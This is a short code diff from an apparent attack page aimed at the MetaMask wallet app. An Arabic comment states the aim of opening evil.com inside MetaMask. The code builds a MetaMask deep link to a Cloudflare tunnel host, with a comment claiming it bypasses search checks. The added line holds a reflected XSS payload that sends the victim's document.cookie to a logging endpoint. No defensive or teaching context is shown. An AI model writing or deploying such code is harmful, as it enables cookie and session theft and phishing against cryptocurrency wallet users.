@@ -23,6 +23,7 @@
     <script>
         // الهدف: فتح evil.com مباشرة داخل ميتاماسك
         const targetSite = "favour-nato-realized-instructor.trycloudflare.com";
+        const xssPayload = "?xss=<script>alert('MetaMask_Reflected_XSS');fetch('/log?data='+document.cookie);</script>";
         
         // استخدام الرابط الرسمي للـ Dapp (هذا المسار يتجاوز فحص البحث)
         const universalLink = "https://metamask.app.link/dapp/" + targetSite;
